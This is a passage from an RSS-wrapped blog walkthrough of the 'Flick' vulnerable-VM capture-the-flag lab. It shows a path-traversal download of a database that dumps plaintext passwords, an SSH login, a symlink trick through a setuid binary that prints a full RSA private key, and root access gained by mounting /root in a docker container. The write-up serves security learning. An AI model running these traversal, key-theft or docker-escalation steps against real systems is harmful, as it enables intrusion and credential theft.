            &amp;#39;host&amp;#39;     =&amp;gt; &amp;#39;localhost&amp;#39;,
            &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;forge&amp;#39;,
            &amp;#39;username&amp;#39; =&amp;gt; &amp;#39;forge&amp;#39;,
            &amp;#39;password&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
            &amp;#39;charset&amp;#39;  =&amp;gt; &amp;#39;utf8&amp;#39;,
            &amp;#39;prefix&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,
            &amp;#39;schema&amp;#39;   =&amp;gt; &amp;#39;public&amp;#39;,
        ), 

        &amp;#39;sqlsrv&amp;#39; =&amp;gt; array(
            &amp;#39;driver&amp;#39;   =&amp;gt; &amp;#39;sqlsrv&amp;#39;,
            &amp;#39;host&amp;#39;     =&amp;gt; &amp;#39;localhost&amp;#39;,
            &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;database&amp;#39;,
            &amp;#39;username&amp;#39; =&amp;gt; &amp;#39;root&amp;#39;,
            &amp;#39;password&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
            &amp;#39;prefix&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,
        ),

    ),    

    &amp;#39;redis&amp;#39; =&amp;gt; array(

        &amp;#39;cluster&amp;#39; =&amp;gt; false,

        &amp;#39;default&amp;#39; =&amp;gt; array(
            &amp;#39;host&amp;#39;     =&amp;gt; &amp;#39;127.0.0.1&amp;#39;,
            &amp;#39;port&amp;#39;     =&amp;gt; 6379,
            &amp;#39;database&amp;#39; =&amp;gt; 0,
        ),

    ),
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;access &lt;strong&gt;http://192.168.10.42/image/download?filename=&amp;hellip;.//&amp;hellip;.//&amp;hellip;.//&amp;hellip;.//var/www/flick_photos/app/database/production.sqlite&lt;/strong&gt;, and download sqlite database.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:flick/ $ sqlite3 production.sqlite 
SQLite version 3.8.10.2 2015-05-20 18:17:19
Enter &amp;quot;.help&amp;quot; for usage hints.
sqlite&amp;gt; .databases
Error: file is encrypted or is not a database
lab:flick/ $ file production.sqlite 
production.sqlite: SQLite 2.x database
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;sqlite&amp;gt; .tables
old_users
sqlite&amp;gt; .dump old_users
BEGIN TRANSACTION;
CREATE TABLE old_users (
  username text,
  password text
);
INSERT INTO old_users VALUES(&amp;#39;paul&amp;#39;,&amp;#39;nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi&amp;#39;);
INSERT INTO old_users VALUES(&amp;#39;robin&amp;#39;,&amp;#39;JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1&amp;#39;);
INSERT INTO old_users VALUES(&amp;#39;james&amp;#39;,&amp;#39;scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5&amp;#39;);
INSERT INTO old_users VALUES(&amp;#39;dean&amp;#39;,&amp;#39;FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA&amp;#39;);
COMMIT;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;we can connect to host with SSH with &lt;strong&gt;robin&lt;/strong&gt; and &lt;strong&gt;dean&lt;/strong&gt;. dean can login it successfully.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt; .o88o. oooo   o8o            oooo        
 888 `&amp;quot; `888   `&amp;quot;&amp;#39;            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88&amp;#39; `&amp;quot;Y8  888 .8P&amp;#39;   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P&amp;#39; o888o o888o 


dean@192.168.10.42&amp;#39;s password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Jul 21 10:20:28 SAST 2015

  System load:  0.0               Processes:              87
  Usage of /:   36.0% of 6.99GB   Users logged in:        0
  Memory usage: 50%               IP address for eth0:    192.168.10.42
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release &amp;#39;14.04.2 LTS&amp;#39; available.
Run &amp;#39;do-release-upgrade&amp;#39; to upgrade to it.

Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$ 
dean@flick:~$ ls -l /var/www/
flick_photos/ index.php     
dean@flick:~$ ls -l /var/www/flick_photos/
total 100
drwxr-xr-x 12 www-data www-data  4096 Aug  1  2014 app
-rw-r--r--  1 www-data www-data  2452 Aug  1  2014 artisan
drwxr-xr-x  2 www-data www-data  4096 Aug  1  2014 bootstrap
-rw-r--r--  1 www-data www-data   697 Aug  1  2014 composer.json
-rw-r--r--  1 www-data www-data 59423 Aug  1  2014 composer.lock
-rw-r--r--  1 www-data www-data   146 Aug  1  2014 CONTRIBUTING.md
-rw-r--r--  1 www-data www-data   567 Aug  1  2014 phpunit.xml
drwxr-xr-x  7 www-data www-data  4096 Aug  1  2014 public
-rw-r--r--  1 www-data www-data  2051 Aug  1  2014 readme.md
-rw-r--r--  1 www-data www-data   519 Aug  1  2014 server.php
drwxr-xr-x 20 www-data www-data  4096 Aug  1  2014 vendor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;

&lt;h3&gt;docker&lt;/h3&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;dean@flick:~$ ./read_docker /home/robin/flick-dev/
# Flick-a-photo dev env
RUN apt-get update &amp;amp;&amp;amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;amp;&amp;amp; apt-get clean &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/*

CMD [&amp;quot;/usr/sbin/apache2&amp;quot;, &amp;quot;-D&amp;quot;, &amp;quot;FOREGROUND&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ls -l
total 36
lrwxrwxrwx 1 dean  dean    23 Jul 21 11:16 Dockerfile -&amp;gt; /home/robin/.ssh/id_rsa
-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
dean@flick:~$ ./read_docker /home/dean/
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;dean@flick:~$ ssh -i ~/.ssh/id_rsa robin@192.168.10.42
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;robin@flick:~$ docker run ubuntu ls -l /home
total 0
robin@flick:~$ docker run ubuntu ls -l /root
total 0
robin@flick:~$ docker run -t -i -v /root:/root ubuntu /bin/bash
root@a86a88c8f91b:/# ls -l /root/
total 8
drwxr-xr-x 2 root root 4096 Aug  1  2014 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-rw-r--r-- 1 root root   67 Aug  1  2014 flag.txt
root@a86a88c8f91b:/# cat /root/flag.txt 
Errr, you are close, but this is not the flag you are looking for.
root@a86a88c8f91b:/# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
Congrats!

You have completed &amp;#39;flick&amp;#39;! I hope you have enjoyed doing it as much as I did creating it :)

ciao for now!
@leonjza
root@a86a88c8f91b:/# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;

&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;9 Feb 2015 - &lt;a href=&quot;https://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/&quot;&gt;Pentest lab - Flick&lt;/a&gt; (chousensha)&lt;/li&gt;
&lt;li&gt;8 Oct 2014 - &lt;a href=&quot;http://resources.infosecinstitute.com/flick-challenge/&quot;&gt;Flick Challenge&lt;/a&gt; (Infosec Institute)&lt;/li&gt;
&lt;li&gt;12 Sep 2014 - &lt;a href=&quot;http://stealthsploit.com/2014/09/12/quick-tricks-to-beat-the-flick/&quot;&gt;Quick tricks to beat the Flick&lt;/a&gt; (ChP4wned)&lt;/li&gt;
&lt;li&gt;17 Aug 2014 - &lt;a href=&quot;http://shieldsec.com/pentest/vulnhub-flick-vm-writeup/&quot;&gt;Vulnhub Flick VM Writeup&lt;/a&gt; (Captain-Fungi)&lt;/li&gt;
&lt;li&gt;16 Aug 2014 - &lt;a href=&quot;http://rastamouse.me/blog/2014/flick-1/&quot;&gt;Flick: 1&lt;/a&gt; (Rasta Mouse)&lt;/li&gt;
&lt;li&gt;14 Aug 2014 - &lt;a href=&quot;http://blog.techorganic.com/2014/08/14/flick-hacking-challenge/&quot;&gt;Flick Hacking Challenge&lt;/a&gt; (superkojiman)&lt;/li&gt;
&lt;li&gt;13 Aug 2014 - &lt;a href=&quot;http://drxpsec-drxp.rhcloud.com/2014/08/13/flick-vulnerable-vm/&quot;&gt;Flick Vulnerable VM&lt;/a&gt; (drxp)&lt;/li&gt;
&lt;li&gt;13 Aug 2014 - &lt;a href=&quot;http://fourfourfourfour.co/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/&quot;&gt;How Many Hackers Does It Take to Change a Lightbulb ?&lt;/a&gt; (recrudesce)&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
        <link>/2015/09/20/flick_1_workthrough/</link>
        <guid isPermaLink="true">/2015/09/20/flick_1_workthrough/</guid>
      </item>
    
  </channel>
</rss>